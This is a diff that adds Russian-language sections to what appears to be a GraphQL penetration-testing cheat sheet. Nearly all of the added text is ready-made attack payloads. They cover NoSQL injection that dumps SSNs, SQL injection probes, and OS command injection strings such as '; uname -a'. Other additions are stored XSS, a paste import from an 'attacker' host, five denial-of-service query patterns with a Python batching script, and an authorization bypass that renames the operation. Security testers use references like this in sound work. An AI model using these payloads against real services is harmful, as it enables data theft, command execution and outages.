@@ -22,6 +22,7 @@
   - [HTML injection](#title134)
   - [Stored XSS](#title135)
 - [DOS атаки](#title14)
+- - [Способы DOS атаки](#title141)
 - [Обход авторизации](#title15)
 - [Arbitrary File Write + Path Traversal](#title16)
 - [IDOR](#title17)
@@ -217,25 +218,211 @@ mutation {
 
 # <a id="title11">Утечка структур GraphQL</a>
 
-
+Если самоанализ отключен, попробуйте посмотреть исходный код веб-сайта. Запросы часто предварительно загружаются в браузер в виде библиотек `javascript`. Эти предварительно написанные запросы могут предоставить важную информацию о схеме и использовании каждого объекта и функции. На `Sources` вкладке инструментов разработчика можно искать все файлы, чтобы перечислить, где сохраняются запросы. Иногда даже запросы, защищенные администратором, уже выставлены.
+```
+Inspect/Sources/"Search all files"
+file:* mutation
+file:* query
+```
 
 # <a id="title12">Извлечение данных</a>
+
+1)Извлечение данных с использованием edges/nodes  
+Пример:
+```
+{
+    "query": "query {
+        teams{
+            total_count,edges{
+                node{
+                    id,
+                    _id,
+                    about,
+                    handle,
+                    state
+                }
+            }
+        }
+    }
+}
+```
+2)Извлечение данных с использованием проекций  
+*Не забудьте экранировать " внутри опций.*  
+Пример:
+```
+{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
+```
 
 # <a id="title13">Инъекции</a>
 
 ### <a id="title131">NoSQL injection</a>
 
+Используйте `$regex`, `$ne` внутри параметров.  
+Пример:
+```
+{
+    doctors(
+        options: "{\"limit\": 1, \"patients.ssn\" :1}",
+        search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
+        {
+            firstName,
+            lastName,
+            id,
+            patients{
+                ssn
+            }
+        }
+}
+```
+
 ### <a id="title132">SQL injection</a>
+
+Можно использовать стандартные методы проверки приложения на SQLi.  
+Пример:
+```
+{
+    bacon(id: "1'") {
+        id,
+        type,
+        price
+    }
+}
+```
 
 ### <a id="title133">OS command injection</a>
 
+Если в запросе есть параметр который обращается в shell, то возможна инъекция команд.  
+Пример:
+```
+mutation  {
+    importPaste(host:"localhost", port:80, path:"/ ; uname -a", scheme:"http"){
+        result
+    }
+}
+```
+Пример:
+```
+query {
+    systemDiagnostics(username:"admin", password:"password", cmd:"id; ls -l")
+}
+```
+
 ### <a id="title134">HTML injection</a>
+
+Если есть мутация позволяющая создавать или редактировать какие-либо записи, то возможно есть HTML injection.  
+Пример:
+```
+mutation {
+    createPaste(title:"<h1>hello!</h1>", content:"zzzz", public:true) {
+        paste {
+            id
+        }
+    }
+}
+```
 
 ### <a id="title135">Stored XSS</a>
 
+Если есть мутация позволяющая создавать или редактировать какие-либо записи, то возможно есть stored xss.  
+Пример:
+```
+mutation {
+    createPaste(title:"<script>alert(1)</script>", content:"zzzz", public:true) {
+        paste {
+            id
+        }
+    }
+}
+```
+Пример с импортом файла:
+```
+mutation {
+    importPaste(host:"attacker", port:80, path:"/xss.html"")
+}
+```
+
 # <a id="title14">DOS атаки</a>
 
+Факторы для выявление возможных векторов:
+- Есть запрос который долго выполняется;
+- Есть ссылающиеся друг на друга типы, фрагменты(построение кругового запроса);
+- Нет анализа затрат;
+- Нет удаления дублированных полей;
+- Нет удаления повторяющихся шаблонов.
+
+### <a id="title141">Способы DOS атаки</a>
+
+**1)Атака пакетного запроса**
+```
+data = [
+{"query":"query {\n  Large\n}"},
+{"query":"query {\n  Large\n}"},
+{"query":"query {\n  Large\n}"}
+]
+  
+requests.post('http://[test_host]/[endpoint]', json=data)
+```
+**2)Атака глубоких рекурсивных запросов**
+```
+query {
+    first {
+        second {
+            first {
+                …
+            }
+        }
+    }
+}
+```
+**3)Атака дублирования полей**
+```
+query {
+    first {
+        second {
+            first {
+                func # 1
+                func # 2
+                func # 3
+                ...
+                func # 1000
+            }
+        }
+    }
+}
+```
+**4)Атака на основе псевдонимов**
+```
+query {
+    q1: Large
+    q2: Large
+    q3: Large
+}
+```
+**5)Атака на основе круговых фрагментов**
+```
+query {
+    ...A
+}
+
+fragment A on PasteObject {
+    content
+    title
+    ...B
+}
+
+fragment B on PasteObject {
+    content
+    title
+    ...A
+}
+```
+
 # <a id="title15">Обход авторизации</a>
+
+Некоторые запросы могут быть запрещены, для обхода используйте **названия операций**.  
+Пример:  
+``requests.post('http://host/graphql', json={"query":"query { systemHealth }"})`` *- Отказ в доступе*  
+``requests.post('http://host/graphql', json={"query":"query getPastes { systemHealth }"})`` *- Доступ разрешен*
 
 # <a id="title16">Arbitrary File Write + Path Traversal</a>
 
